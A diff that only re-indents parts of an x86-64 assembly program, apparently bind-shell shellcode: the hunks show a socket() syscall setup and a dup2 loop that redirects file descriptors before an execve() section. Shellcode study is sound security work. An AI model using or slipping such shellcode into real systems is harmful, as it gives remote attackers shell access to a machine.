@@ -6,14 +6,14 @@ _start:
 
 ; syscall socket()
 
-	  push 0x29
-	  pop rax                        ; syscall socket = 41
-	  push 0x02
-	  pop rdi                        ; AF_INET = 2
-	  push 0x01
-	  pop rsi                        ; SOCKET_STREAM = 1
-	  cdq                            ; rdx = 0
-	  syscall
+    push 0x29
+    pop rax                        ; syscall socket = 41
+    push 0x02
+    pop rdi                        ; AF_INET = 2
+    push 0x01
+    pop rsi                        ; SOCKET_STREAM = 1
+    cdq                            ; rdx = 0
+    syscall
     mov rdi, rax                   ; store for future references
     
 ; syscall bind()
@@ -68,10 +68,10 @@ _start:
     mov rdi, r9                    ; rdi -> file descriptor
 
 loop:
-	  push 0x21
-	  pop rax                        ; syscall dup2 = 33
-	  syscall
-	  dec rsi                        ; decrement fd
+    push 0x21
+    pop rax                        ; syscall dup2 = 33
+    syscall
+    dec rsi                        ; decrement fd
     jns loop
   
 ; syscall execve()
